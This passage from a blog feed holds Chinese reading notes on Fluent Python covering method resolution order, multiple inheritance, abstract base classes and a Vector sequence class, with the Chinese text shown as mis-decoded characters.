ä¸ºPythonä¼šæŒ‰ç…§ç‰¹å®šçš„é¡ºåºéå†ç»§æ‰¿å›¾ï¼Œè¿™ä¸ªé¡ºåºå«åšæ–¹æ³•è§£æé¡ºåº(Method Resolution Orderï¼ŒMRO), Pythonä¸­çš„ç±»éƒ½æœ‰ä¸€ä¸ªåä¸º__mro__çš„å±æ€§ï¼Œå®ƒçš„å€¼æ˜¯ä¸€ä¸ªå…ƒç»„ï¼ŒæŒ‰ç…§æ–¹æ³•æˆ’å­é¡ºåºåˆ—å‡ºå„ä¸ªè¶…ç±»ï¼Œä»å½“å‰ç±»ä¸€ç›´å‘ä¸Šï¼Œç›´åˆ°objectç±»ã€‚ä¾‹å¦‚tenserflowä¸­çš„Variableç±» 123&gt;&gt;&gt; import tensorflow as tf&gt;&gt;&gt; tf.Variable.__mro__&gt;&gt;&gt; (&lt;class 'tensorflow.python.ops.variables.Variable'&gt;, &lt;class 'tensorflow.python.training.checkpointable.base.CheckpointableBase'&gt;, &lt;class 'object'&gt;) å¦‚æœæŠŠæ–¹æ³•è°ƒç”¨å§”æ‰˜ç»™è¶…ç±»ï¼Œå¯ä»¥æœ‰ä¸‹é¢ä¸¤ç§é€‰æ‹©: ä½¿ç”¨super()å‡½æ•°å¦‚Foo_son.super().bar(), è¿™ä¸ªæ–¹æ³•çš„å¥½å¤„åœ¨äºå®‰å…¨ï¼Œä¸ä¼šè¿‡æ—¶ã€‚é€‚åˆä½¿ç”¨çš„åœºæ™¯: è°ƒç”¨æ¡†æ¶æˆ–è€…ä¸å—è‡ªå·±æ§åˆ¶çš„ç±»å±‚æ¬¡ç»“æ„ä¸­çš„æ–¹æ³• å¦‚æœæƒ³è¦ç»•è¿‡æ–¹æ³•è§£æ, ç›´æ¥è°ƒç”¨è¶…ç±»çš„æŸä¸ªæ–¹æ³•ï¼Œå¯ä»¥ç›´æ¥ä½¿ç”¨è¶…ç±»ç±»åä»£æ›¿super()å‡½æ•°ï¼Œå¦‚Foo.bar() æ–¹æ³•è§£æé¡ºåºä¸ä»…è€ƒè™‘ç»§æ‰¿å›¾ï¼Œè¿˜è€ƒè™‘å­ç±»å£°æ˜ä¸­åˆ—å‡ºè¶…ç±»çš„é¡ºåºã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœæŠŠ D ç±»å£°æ˜ä¸º class D(C, B):ï¼Œé‚£ä¹ˆ D ç±»çš„__mro__ å±æ€§å°±æ˜¯ï¼šå…ˆæœç´¢ C ç±»ï¼Œå†æœç´¢ B ç±»ã€‚ 12.3 å¤šé‡ç»§æ‰¿çš„çœŸå®åº”ç”¨æ ‡å‡†åº“ä¸­ï¼ŒGUIå·¥å…·åŒ…TkinteræŠŠå¤šé‡ç»§æ‰¿ç”¨åˆ°äº†æè‡´ã€‚ å…¶ä¸­å‡ ä¸ªç±»ï¼š Toplevelï¼šè¡¨ç¤º Tkinter åº”ç”¨ç¨‹åºä¸­é¡¶å±‚çª—å£çš„ç±»ã€‚ Widgetï¼šçª—å£ä¸­æ‰€æœ‰å¯è§å¯¹è±¡çš„è¶…ç±»ã€‚ Buttonï¼šæ™®é€šçš„æŒ‰é’®å°ç»„ä»¶ã€‚ Entryï¼šå•è¡Œå¯ç¼–è¾‘æ–‡æœ¬å­—æ®µã€‚ Textï¼šå¤šè¡Œå¯ç¼–è¾‘æ–‡æœ¬å­—æ®µ ä½†ç”±äºTkinterå¼€å‘æ—¶é—´æ¯”è¾ƒä¹…è¿œï¼Œå¾ˆå¤šä½¿ç”¨å¤šé‡ç»§æ‰¿ä¸èƒ½ç§°ä½œæ˜¯æœ€ä½³çš„å®è·µã€‚åé¢ä¼šå¯¹Tkinterä½¿ç”¨å¤šé‡ç»§æ‰¿çš„å¯å–ä¹‹å¤„å’Œä¸å½“ä¹‹å¤„è¿›è¡Œè®¨è®º 12.4 å¤„ç†å¤šé‡ç»§æ‰¿ â€¦â€¦æˆ‘ä»¬éœ€è¦ä¸€ç§æ›´å¥½çš„ã€å…¨æ–°çš„ç»§æ‰¿ç†è®ºï¼ˆç›®å‰ä»æ˜¯å¦‚æ­¤ï¼‰ã€‚ä¾‹å¦‚ï¼Œç»§æ‰¿å’Œå®ä¾‹åŒ–ï¼ˆä¸€ç§ç»§æ‰¿æ–¹å¼ï¼‰æ··æ·†äº†è¯­ç”¨ï¼ˆæ¯”å¦‚ä¸ºäº†èŠ‚çœç©ºé—´è€Œé‡æ„ä»£ç ï¼‰å’Œè¯­ä¹‰ï¼ˆç”¨é€”å¤ªå¤šäº†ï¼Œæ¯”å¦‚ç‰¹æ®ŠåŒ–ã€æ™®éåŒ–ã€å½¢æ€ï¼Œç­‰ç­‰ï¼‰ã€‚ â€”â€”Alan Kay å¦‚ä¸Šé¢å¼•ç”¨çš„ä¸€æ®µè¯ï¼Œ ç»§æ‰¿æœ‰å¾ˆå¤šç”¨é€”ï¼Œè€Œå¤šé‡ç»§æ‰¿å¢åŠ äº†å¯é€‰æ–¹æ¡ˆå’Œå¤æ‚åº¦ã€‚ä½¿ç”¨å¤šé‡ç»§æ‰¿å®¹æ˜“å¾—å‡ºä»¤äººè´¹è§£å’Œè„†å¼±çš„è®¾è®¡ã€‚ æš‚æ—¶è¿˜æ²¡æœ‰é’ˆå¯¹å¤šé‡ç»§æ‰¿å®Œæ•´çš„ç†è®ºï¼Œä¸‹é¢æ˜¯é¿å…æŠŠç±»å›¾æ…ä¹±çš„ä¸€äº›å»ºè®®ã€‚ æŠŠæ¥å£ç»§æ‰¿å’Œå®ç°ç»§æ‰¿åŒºåˆ†å¼€æ¥ ä½¿ç”¨å¤šé‡ç»§æ‰¿æ˜¯ï¼Œä¸€å®šè¦æ˜ç¡®ä¸ºä»€ä¹ˆåˆ›å»ºå­ç±»ã€‚ä¸€èˆ¬åŸå› å¯èƒ½æœ‰ï¼š ç»§æ‰¿æ¥å£ï¼Œåˆ›å»ºå­ç±»å‹ï¼Œ å®ç°â€œæ˜¯ä»€ä¹ˆâ€ ç»§æ‰¿å®ç°ï¼Œé€šè¿‡ç»§æ‰¿é¿å…ä»£ç å¤ç”¨å…¶å®è¿™ä¸¤æ¡ç»å¸¸åŒæ—¶å‡ºç°ï¼Œä¸è¿‡åªè¦å¯èƒ½çš„è¯ï¼Œä¸€å®šè¦æ˜ç¡®åŒºåˆ†ã€‚å‰è€…æ˜¯æ”¯æ’‘æ¡†æ¶çš„æ”¯æŸ±ï¼Œåè€…æ˜¯å®ç°ç»†èŠ‚ï¼Œé€šå¸¸å¯ä»¥æ¢ç”¨ç»„åˆå’Œå§”æ‰˜æ¨¡å¼ã€‚ ä½¿ç”¨æŠ½è±¡åŸºç±»æ˜¾å¼è¡¨ç¤ºæ¥å£ å¦‚æœç±»çš„ä½œç”¨æ˜¯å®šä¹‰æ¥å£ï¼Œåº”è¯¥æ˜ç¡®å®šä¸ºæŠ½è±¡åŸºç±» é€šè¿‡æ··å…¥(mixin)é‡ç”¨ä»£ç  å¦‚æœä¸€ä¸ªç±»çš„ä½œç”¨æ˜¯ä¸ºå¤šä¸ªä¸ç›¸å…³çš„å­ç±»æä¾›æ–¹æ³•å®ç°ï¼Œä»è€Œå®ç°é‡ç”¨ï¼Œä½†ä¸ä½“ç°â€œæ˜¯ä»€ä¹ˆâ€å…³ç³»ï¼Œåº”è¯¥æŠŠé‚£ä¸ªç±»æ˜ç¡®åœ°å®šä¹‰ä¸ºæ··å…¥ç±»ï¼ˆmixin classï¼‰ã€‚ä»æ¦‚å¿µä¸Šè®²ï¼Œæ··å…¥ä¸å®šä¹‰æ–°ç±»å‹ï¼Œåªæ˜¯æ‰“åŒ…æ–¹æ³•ï¼Œä¾¿äºé‡ç”¨ã€‚æ··å…¥ç±»ç»å¯¹ä¸èƒ½å®ä¾‹åŒ–ï¼Œè€Œä¸”å…·ä½“ç±»ä¸èƒ½åªç»§æ‰¿æ··å…¥ç±»ã€‚æ··å…¥ç±»åº”è¯¥æä¾›æŸæ–¹é¢çš„ç‰¹å®šè¡Œä¸ºï¼Œåªå®ç°å°‘é‡å…³ç³»éå¸¸ç´§å¯†çš„æ–¹æ³•ã€‚ åœ¨åç§°ä¸­æ˜ç¡®æŒ‡æ˜æ··å…¥ æ··å…¥ç±»åº”è¯¥ä»¥Mixin ä½œä¸ºåç¼€(åœ¨djangoçš„GenericViewsä¸­å°¤ä¸ºå¸¸è§) æŠ½è±¡åŸºç±»å¯ä»¥ä½œä¸ºæ··å…¥ï¼Œåä¹‹ä¸æˆç«‹ã€‚ æŠ½è±¡åŸºç±»å¯ä»¥å®ç°å…·ä½“æ–¹æ³•ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ä½œä¸ºæ··å…¥ä½¿ç”¨ã€‚æŠ½è±¡åŸºç±»å¯ä»¥ä½œä¸ºå…¶ä»–ç±»çš„å”¯ä¸€åŸºç±»ï¼Œè€Œæ··å…¥å†³ä¸èƒ½ä½œä¸ºå”¯ä¸€çš„è¶…ç±»ï¼Œé™¤éç»§æ‰¿å¦ä¸€ä¸ªæ›´å…·ä½“çš„æ··å…¥ã€‚ æŠ½è±¡åŸºç±»ä¸­å®ç°çš„å…·ä½“æ–¹æ³•åªèƒ½ä¸æŠ½è±¡åŸºç±»åŠå…¶è¶…ç±»ä¸­çš„æ–¹æ³•åä½œã€‚ ä¸è¦å­ç±»åŒ–å¤šä¸ªå…·ä½“ç±» å…·ä½“ç±»çš„è¶…ç±»ä¸­é™¤äº†ä¸€ä¸ªå…·ä½“è¶…ç±»ä¹‹å¤–ï¼Œå…¶ä½™çš„éƒ½åº”è¯¥æ˜¯æŠ½è±¡åŸºç±»æˆ–æ··å…¥ã€‚ ä¸ºç”¨æˆ·æä¾›èšåˆç±» å¦‚æœæŠ½è±¡åŸºç±»æˆ–æ··å…¥çš„ç»„åˆå¯¹å®¢æˆ·ä»£ç éå¸¸æœ‰ç”¨ï¼Œé‚£å°±æä¾›ä¸€ä¸ªç±»ï¼Œä½¿ç”¨æ˜“äºç†è§£çš„æ–¹å¼æŠŠå®ƒä»¬ç»“åˆèµ·æ¥ã€‚ Grady Booch æŠŠè¿™ç§ç±»ç§°ä¸ºèšåˆç±»ï¼ˆaggregate classï¼‰ã€‚ èšåˆç±»æ°å¦‚å…¶åï¼Œåªåšèšåˆï¼Œä¸é¢å¤–å®ç°ç±»æ–¹æ³• â€œä¼˜å…ˆä½¿ç”¨å¯¹è±¡ç»„åˆï¼Œè€Œä¸æ˜¯ç±»ç»§æ‰¿â€ ä¼˜å…ˆä½¿ç”¨ç»„åˆèƒ½è®©è®¾è®¡æ›´çµæ´»ã€‚ç»„åˆå’Œå§”æ‰˜å¯ä»¥ä»£æ›¿æ··å…¥ï¼ŒæŠŠè¡Œä¸ºæä¾›ç»™ä¸åŒçš„ç±»ï¼Œä½†æ˜¯ä¸èƒ½å–ä»£æ¥å£ç»§æ‰¿å»å®šä¹‰ç±»å‹å±‚æ¬¡ç»“æ„ã€‚ 12.5 å°ç»“æœ¬ç« ç€é‡æ¢è®¨äº†å¤šé‡ç»§æ‰¿è¿™æŠŠåŒåˆƒå‰‘ã€‚è®²è¿°äº†Pythonä¸­çš„MROï¼ˆæ–¹æ³•è§£æé¡ºåºï¼‰ï¼Œæ¢è®¨äº†å¤šé‡ç»§æ‰¿å®ç°çš„ä¸€äº›å¯ä»¥ç§°ä¹‹ä¸ºå‡†åˆ™çš„æœ€ä½³å®è·µæ ‡å‡†ã€‚]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>fluent python</tag>
        <tag>inheritance</tag>
        <tag>multiple inheritance</tag>
        <tag>mro</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python ç¬¬åä¸€ç«  ä»åè®®åˆ°æŠ½è±¡åŸºç±»]]></title>
    <url>%2F2018%2F07%2F28%2Ffluent-python-11%2F</url>
    <content type="text"><![CDATA[Fluent Python ç¬¬åäºŒç« è¯»ä¹¦æŠ¥å‘Š Chapter 11. Interfaces From Protocols to ABCsç¬¬åä¸€ç« : ä»åè®®åˆ°æŠ½è±¡åŸºç±»æœ¬ç« ä¸»è¦è®¨è®ºæ¥å£ï¼Œä»é¸­å­ç±»å‹çš„åŠ¨æ€åè®®åˆ°ä½¿æ¥å£æ›´åŠ æ˜ç¡®ï¼Œèƒ½éªŒè¯å®ç°æ˜¯å¦ç¬¦åˆè§„å®šçš„æŠ½è±¡åŸºç±»ï¼ˆABCï¼‰ æœ¬ç« ä¼šä¸“é—¨è®²è§£æŠ½è±¡åŸºç±»ã€‚é¦–å…ˆï¼Œæœ¬ç« è¯´æ˜æŠ½è±¡åŸºç±»çš„å¸¸è§ç”¨é€”ï¼šå®ç°æ¥å£æ—¶ä½œä¸ºè¶…ç±»ä½¿ç”¨ã€‚ç„¶åï¼Œè¯´æ˜æŠ½è±¡åŸºç±»å¦‚ä½•æ£€æŸ¥å…·ä½“å­ç±»æ˜¯å¦ç¬¦åˆæ¥å£å®šä¹‰ï¼Œä»¥åŠå¦‚ä½•ä½¿ç”¨æ³¨å†Œæœºåˆ¶å£°æ˜ä¸€ä¸ªç±»å®ç°äº†æŸä¸ªæ¥å£ï¼Œè€Œä¸è¿›è¡Œå­ç±»åŒ–æ“ä½œã€‚æœ€åï¼Œè¯´æ˜å¦‚ä½•è®©æŠ½è±¡åŸºç±»è‡ªåŠ¨â€œè¯†åˆ«â€ä»»ä½•ç¬¦åˆæ¥å£çš„ç±»â€”â€”ä¸è¿›è¡Œå­ç±»åŒ–æˆ–æ³¨å†Œã€‚ Python ä¸­çš„æ¥å£å’Œåè®®Pythonä¸­ï¼Œæˆ‘ä»¬æŠŠåè®®å®šä¸ºéæ­£å¼çš„æ¥å£ï¼Œ åè®®ä¹Ÿæ˜¯Pythonè¿™ç±»åŠ¨æ€è¯­è¨€å®ç°å¤šæ€çš„æ–¹å¼ã€‚ Python ä¸­æ¥å£çš„è¿ä½œæ–¹å¼: Python ä¸­æ²¡æœ‰interface å…³é”®å­—ï¼Œ å¹¶ä¸”é™¤äº†æŠ½è±¡åŸºç±»ï¼ˆABCï¼‰,æ¯ä¸ªç±»éƒ½æœ‰æ¥å£ï¼Œå®ç°æ–¹å¼ä¸ºï¼šç±»å®ç°æˆ–ç»§æ‰¿å…¬å¼€å±æ€§(æ–¹æ³•æˆ–è€…æ•°æ®å±æ€§) å…³äºæ¥å£æœ‰ä¸€ä¸ªå®ç”¨çš„è¡¥å……å®šä¹‰ï¼šå¯¹è±¡å…¬å¼€æ–¹æ³•çš„å­é›†ï¼Œè®©å¯¹è±¡åœ¨ç³»ç»Ÿä¸­æ‰®æ¼”ç‰¹å®šè§’è‰²ã€‚å€Ÿå£æ˜¯å®ç°ç‰¹å®šè§’è‰²çš„æ–¹æ³•çš„é›†åˆï¼Œè¿™å°±æ˜¯åè®®ã€‚åè®®ä¸ç»§æ‰¿æ²¡æœ‰å…³ç³»ï¼Œä¸€ä¸ªç±»å¯èƒ½å®ç°å¤šä¸ªæ¥å£ä½¿åŒä¸€ä¸ªå®ä¾‹æ‰®æ¼”å¤šä¸ªè§’è‰²ã€‚ åè®®ä¸æ˜¯æ­£å¼çš„æ¥å£, æ²¡æœ‰æ¥å£ä¸€è‡´æ€§çš„å„ç§å¼ºåˆ¶ï¼Œå› æ­¤ä¸€ä¸ªç±»å¯ä»¥åªå®ç°éƒ¨åˆ†æ¥å£ã€‚ Pythonä¸­çš„åºåˆ—åè®®Pythonä¸­æ•°æ®æ¨¡å‹çš„å“²å­¦æ˜¯å°½é‡æ”¯æŒåŸºæœ¬åè®®ï¼Œ ä¸‹é¢çš„å›¾å±•ç¤ºäº†æŠ½è±¡åŸºç±»Sequenceçš„æ­£å¼æ¥å£ã€‚ å¦‚æœæ²¡æœ‰å®ç°__iter__å’Œ__contains__æ–¹æ³•ï¼Œ Pythonä¼šè°ƒç”¨__getitem__æ–¹æ³•ï¼Œ è®¾æ³•è®©è¿­ä»£å’Œinè¿ç®—ç¬¦å¯ç”¨ã€‚å‡ åä¸€ä¸ªå¯¹è±¡åªå®ç°äº†__getitem__æ–¹æ³•ï¼Œä¹Ÿèƒ½è¿›è¡Œè¿­ä»£ï¼Œä¸ºäº†è¿­ä»£å¯¹è±¡ï¼Œè§£é‡Šå™¨ä¼šå°è¯•è°ƒç”¨ä¸¤ä¸ªä¸åŒçš„æ–¹æ³•ã€‚ ä½¿ç”¨çŒ´å­è¡¥ä¸åœ¨è¿è¡Œæ—¶å®ç°åè®® å¾—ç›Šäºé¸­å­ç±»å‹ï¼Œå¦‚æœéµå®ˆæ—¢å®šçš„åè®®ï¼Œå¾ˆæœ‰å¯èƒ½å¢åŠ åˆ©ç”¨ç°æœ‰çš„æ ‡å‡†åº“å’Œç¬¬ä¸‰æ–¹ä»£ç çš„å¯èƒ½æ€§ã€‚çŒ´å­è¡¥ä¸: åœ¨è¿è¡Œæ—¶ä¿®æ”¹ç±»æˆ–è€…æ¨¡å—ï¼Œè€Œä¸æ”¹åŠ¨æºç ã€‚è¿™ç§æŠ€æœ¯éå¸¸å¼ºå¤§ï¼Œä½†æ˜¯æ‰“è¡¥ä¸çš„ä»£ç å’Œè¢«æ‰“è¡¥ä¸çš„ç¨‹åºéœ€è¦è€¦åˆéå¸¸ç´§å¯†ï¼Œè€Œä¸”å¾€å¾€è¦å¤„ç†æ²¡æœ‰æ–‡æ¡£çš„éƒ¨åˆ†ã€‚ åè®®å¯ä»¥æ”¯æŒçŒ´å­è¡¥ä¸ï¼Œ æ°æ°è¯´æ˜äº†åè®®çš„åŠ¨æ€æ€§ï¼š å³ä½¿å¯¹è±¡ä¸€å¼€å§‹æ²¡æœ‰å®ç°æ‰€éœ€çš„æ–¹æ³•ï¼Œåæ¥ç”¨è¡¥ä¸çš„å½¢å¼åŠ è¿›å»ä¹Ÿè¡Œã€‚è¿™ä¹Ÿæ˜¯é¸­å­ç±»å‹æ€æƒ³çš„ä¸€ä¸ªç¼©å½±ã€‚ å…³äºæŠ½è±¡åŸºç±»å’Œç™½é¹…ç±»å‹ ç™½é¹…ç±»å‹ï¼š åªè¦clsæ˜¯æŠ½è±¡åŸºç±»ï¼Œ å³clsçš„å…ƒç±»æ˜¯abc.ABCMeta, å°±å¯ä»¥ä½¿ç”¨isinstance(obj, cls) æŠ½è±¡åŸºç±»çš„æœ¬è´¨å°±æ˜¯å‡ ä¸ªç‰¹æ®Šæ–¹æ³•çš„é›†åˆ å¯ä»¥ç”¨instance(obj, cls)æ£€æŸ¥ç±»æ˜¯å¦å·²ç»å®ç°äº†æŠ½è±¡åŸºç±»å®šä¹‰çš„apiå¥‘çº¦ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ ç”Ÿäº§ä»£ç ä¸­å°½é‡é¿å…å®šä¹‰æŠ½è±¡åŸºç±»ï¼Œæå®¹æ˜“å› ä¸ºè®¾è®¡ä¸å½“é€ æˆæ»¥ç”¨ï¼Œæ»¥ç”¨æŠ½è±¡åŸºç±»ä¼šé€ æˆç¾éš¾æ€§çš„åæœ æŠ½è±¡åŸºç±»æ˜¯å°è£…æ¡†æ¶å¼•å…¥ä¸€èˆ¬æ€§æ¦‚å¿µå’ŒæŠ½è±¡çš„ã€‚ å®šä¹‰æŠ½è±¡åŸºç±»çš„å­ç±»è¦æƒ³å®ç°å­ç±»ï¼Œå¯ä»¥è¦†ç›–ä»æŠ½è±¡åŸºç±»ä¸­ç»§æ‰¿çš„æ–¹æ³•ï¼Œä»¥æ›´é«˜æ•ˆçš„æ–¹å¼é‡æ–°å®ç°ã€‚ä¾‹å¦‚__contains__æ–¹æ³•ä¼šæ‰«æåºåˆ—ï¼Œå¦‚æœä½ å®šä¹‰çš„åºåˆ—æŒ‰é¡ºåºæ’åˆ—ï¼Œé‚£ä¹ˆå°±å¯ä»¥é‡æ–°å®šä¹‰è¿™ä¸ªæ–¹æ³•ä½¿ç”¨bisectå‡½æ•°äºŒåˆ†æŸ¥æ‰¾ã€‚ æ ‡å‡†åº“ä¸­çš„æŠ½è±¡åŸºç±»collections.abcæ¨¡å—Python æ ‡å‡†åº“ä¸­æœ‰ä¸¤ä¸ªabcæ¨¡å—ï¼Œä¸€ä¸ªæ˜¯collections.abcï¼Œ å¦ä¸€ä¸ªæ˜¯abc.ABCï¼Œåè€…æ˜¯æ‰€æœ‰æŠ½è±¡åŸºç±»çš„ä¾èµ–ã€‚collections.abcç±»ä¸­æœ‰16ä¸ªæŠ½è±¡åŸºç±»ï¼Œå®ƒä»¬çš„ç»§æ‰¿å…³ç³»å¦‚ä¸‹å›¾æ‰€ç¤º: Iterableã€Container å’Œ Sized å„ä¸ªé›†åˆåº”è¯¥ç»§æ‰¿è¿™ä¸‰ä¸ªæŠ½è±¡åŸºç±»ï¼Œæˆ–è€…è‡³å°‘å®ç°å…¼å®¹çš„åè®®ã€‚Iterable é€šè¿‡__iter__æ–¹æ³•æ”¯æŒè¿­ä»£ï¼ŒContainer é€šè¿‡ __contains__ æ–¹æ³•æ”¯æŒ in è¿ç®—ç¬¦ï¼ŒSizedé€šè¿‡ __len__ æ–¹æ³•æ”¯æŒ len() å‡½æ•°ã€‚ Sequenceã€Mapping å’Œ Set è¿™ä¸‰ä¸ªæ˜¯ä¸»è¦çš„ä¸å¯å˜é›†åˆç±»å‹ï¼Œè€Œä¸”å„è‡ªéƒ½æœ‰å¯å˜çš„å­ç±»ã€‚ MappingView åœ¨ Python 3 ä¸­ï¼Œæ˜ å°„æ–¹æ³• .items()ã€.keys() å’Œ .values() è¿”å›çš„å¯¹è±¡åˆ†åˆ«æ˜¯ItemsView ã€KeysView å’Œ ValuesView çš„å®ä¾‹ã€‚å‰ä¸¤ä¸ªç±»è¿˜ä» Set ç±»ç»§æ‰¿äº†ä¸°å¯Œçš„æ¥å£ï¼ŒåŒ…å« 3.8.3 èŠ‚æ‰€è¿°çš„å…¨éƒ¨è¿ç®—ç¬¦ã€‚ Callable å’Œ Hashable è¿™ä¸¤ä¸ªæŠ½è±¡åŸºç±»ä¸é›†åˆæ²¡æœ‰å¤ªå¤§çš„å…³ç³»ï¼Œåªä¸è¿‡å› ä¸º collections.abc æ˜¯æ ‡å‡†åº“ä¸­å®šä¹‰æŠ½è±¡åŸºç±»çš„ç¬¬ä¸€ä¸ªæ¨¡å—ï¼Œè€Œå®ƒä»¬åˆå¤ªé‡è¦äº†ï¼Œå› æ­¤æ‰æŠŠå®ƒä»¬æ”¾åˆ° collections.abcæ¨¡å—ä¸­ã€‚è¿™ä¸¤ä¸ªæŠ½è±¡åŸºç±»çš„ä¸»è¦ä½œç”¨æ˜¯ä¸ºå†…ç½®å‡½æ•° isinstance æä¾›æ”¯æŒï¼Œä»¥ä¸€ç§å®‰å…¨çš„æ–¹å¼åˆ¤æ–­å¯¹è±¡èƒ½ä¸èƒ½è°ƒç”¨æˆ–æ•£åˆ—ã€‚è‹¥æƒ³æ£€æŸ¥æ˜¯å¦èƒ½è°ƒç”¨ï¼Œå¯ä»¥ä½¿ç”¨å†…ç½®çš„ callable() å‡½æ•°ï¼›ä½†æ˜¯æ²¡æœ‰ç±»ä¼¼çš„ hashable() å‡½æ•°ï¼Œå› æ­¤æµ‹è¯•å¯¹è±¡æ˜¯å¦å¯æ•£åˆ—ï¼Œæœ€å¥½ä½¿ç”¨ isinstance(my_obj, Hashable)ã€‚ Iterator å®ƒæ˜¯ Iterable çš„å­ç±»ã€‚ æŠ½è±¡åŸºç±»ä¸­çš„æ•°å­—å¡”numbersnumbersåŒ…å®šä¹‰çš„æ˜¯æ•°å­—å¡”ï¼ŒåŒ…å«çš„ç±»å¦‚ä¸‹ï¼Œé€šè¿‡ç±»åå³å¯åˆ¤æ–­å‡ºä»–ä»¬çš„ç»§æ‰¿å…³ç³»: Number Complex Real Rational Integral æœ¬ç« å°ç»“æœ¬ç« ä»‹ç»äº†Pythonä¸­éæ­£å¼æ¥å£(åè®®çš„é«˜åŠ¨æ€æœ¬æ€§)ï¼Œä»¥åŠPythonä¸­æ¥å£çš„è¿ä½œæ–¹å¼ï¼ŒåŒæ—¶ä»‹ç»äº†Pythonä¸­çš„æŠ½è±¡åŸºç±»åŠå…¶ç±»åˆ«å’Œç”¨é€”ã€‚ å°½ç®¡æŠ½è±¡åŸºç±»ä½¿å¾—ç±»å‹æ£€æŸ¥å˜å¾—æ›´å®¹æ˜“äº†ï¼Œä½†ä¸åº”è¯¥åœ¨ç¨‹åºä¸­è¿‡åº¦ä½¿ç”¨å®ƒã€‚Python çš„æ ¸å¿ƒåœ¨äºå®ƒæ˜¯ä¸€é—¨åŠ¨æ€è¯­è¨€ï¼Œå®ƒå¸¦æ¥äº†æå¤§çš„çµæ´»æ€§ã€‚å¦‚æœå¤„å¤„éƒ½å¼ºåˆ¶å®è¡Œç±»å‹çº¦æŸï¼Œé‚£ä¹ˆä¼šä½¿ä»£ç å˜å¾—æ›´åŠ å¤æ‚ï¼Œè€Œæœ¬ä¸åº”è¯¥å¦‚æ­¤ã€‚æˆ‘ä»¬åº”è¯¥æ‹¥æŠ± Python çš„çµæ´»æ€§.â€œå¦‚æœè§‰å¾—è‡ªå·±æƒ³åˆ›å»ºæ–°çš„æŠ½è±¡åŸºç±»ï¼Œå…ˆè¯•ç€é€šè¿‡å¸¸è§„çš„é¸­å­ç±»å‹æ¥è§£å†³é—®é¢˜ã€‚â€]]></content>
      <categories>
        <category>è¯»ä¹¦ç¬”è®°</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>duck typing</tag>
        <tag>protocal</tag>
        <tag>abstract basic class</tag>
        <tag>ABC</tag>
        <tag>fluent python</tag>
        <tag>interfaces</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Fluent Python ç¬¬åç« å°ç»“]]></title>
    <url>%2F2018%2F05%2F07%2Ffluent-python-10%2F</url>
    <content type="text"><![CDATA[Fluent PythonChapter 10. Sequence Hacking, Hashing, and Slicingç¬¬åç« : åºåˆ—çš„ä¿®æ”¹ã€æ•£åˆ—å’Œåˆ‡ç‰‡ è¿™ç« ä»¥ä¸Šç« çš„Vector2dä¸ºåŸºç¡€ï¼Œå®šä¹‰å¤šç»´å‘é‡ï¼Œè¿™ä¸ªç±»çš„è¡Œä¸ºå’ŒPythonæ ‡å‡†çš„æ‰å¹³åºåˆ—ä¸€æ ·ã€‚å°†å®ç°ä¸‹é¢çš„åŠŸèƒ½ï¼š åŸºæœ¬çš„åºåˆ—åè®®â€”â€” __len__ å’Œ __getitem__ æ­£ç¡®è¡¨è¿°æ‹¥æœ‰å¾ˆå¤šå…ƒç´ çš„å®ä¾‹ é€‚å½“çš„åˆ‡ç‰‡æ”¯æŒï¼Œç”¨äºç”Ÿæˆæ–°çš„ Vector å®ä¾‹ ç»¼åˆå„ä¸ªå…ƒç´ çš„å€¼è®¡ç®—æ•£åˆ—å€¼ è‡ªå®šä¹‰çš„æ ¼å¼è¯­è¨€æ‰©å±• æ­¤å¤–ï¼Œæˆ‘ä»¬è¿˜å°†é€šè¿‡ getattr æ–¹æ³•å®ç°å±æ€§çš„åŠ¨æ€å­˜å–ï¼Œä»¥æ­¤å–ä»£ Vector2d ä½¿ç”¨çš„åªè¯»ç‰¹æ€§â€”â€”ä¸è¿‡ï¼Œåºåˆ—ç±»å‹é€šå¸¸ä¸ä¼šè¿™ä¹ˆåšã€‚ Vectorç±»ï¼šç”¨æˆ·è‡ªå®šä¹‰çš„åºåˆ—ç±»å‹åºåˆ—ç±»å‹çš„æ„é€ æ–¹æ³•æœ€å¥½æ¥å—å¯è¿­ä»£çš„å¯¹è±¡ä¸ºå‚æ•°, é¦–å…ˆæˆ‘ä»¬ä¸ºvectoråŠ ä¸Šè¿™ä¸ªæ„é€ æ–¹æ³• 12345678910111213141516171819202122232425262728293031from array import arrayimport reprlibimport mathclass Vector: typecode = 'd' def __init__(self, components): # å°†vectorçš„åˆ†é‡å­˜å‚¨åœ¨_componentsä¸­ # self._componentsæ˜¯è¿­ä»£å™¨ self._components = array(self.typecode, components) def __iter__(self): return iter(self._components) def __repr__(self): # ä½¿ç”¨ reprlib.repr() å‡½æ•°è·å– self._components çš„æœ‰é™é•¿åº¦è¡¨ç¤ºå½¢å¼ components = reprlib.repr(self._components) components = components[components.find('['):-1] return 'Vector(&#123;&#125;)'.format(components) def __str__(self): return str(tuple(self)) def __bytes__(self): return (bytes([ord(self.typecode)])+bytes(self._components)) def __eq__(self, other): return tuple(self) == tuple(other) def __abs__(self): return math.sqrt(sum(x * x for x in self)) def __bool__(self): return bool(abs(self)) @classmethod def frombytes(cls, octets): typecode = chr(octets[0]) memv = memoryview(octets[1:]).cast(typecode) return cls(memv) æ³¨ï¼š reprlib.repr çš„æ–¹å¼éœ€è¦åšäº›è¯´æ˜ã€‚è¿™ä¸ªå‡½æ•°ç”¨äºç”Ÿæˆå¤§å‹ç»“æ„æˆ–é€’å½’ç»“æ„çš„å®‰å…¨è¡¨ç¤ºå½¢å¼ï¼Œå®ƒä¼šé™åˆ¶è¾“å‡ºå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œç”¨ â€˜â€¦â€™ è¡¨ç¤ºæˆªæ–­çš„éƒ¨åˆ†ã€‚ è°ƒç”¨ repr() å‡½æ•°çš„ç›®çš„æ˜¯è°ƒè¯•ï¼Œå› æ­¤ç»å¯¹ä¸èƒ½æŠ›å‡ºå¼‚å¸¸ã€‚å¦‚æœ \_repr__ 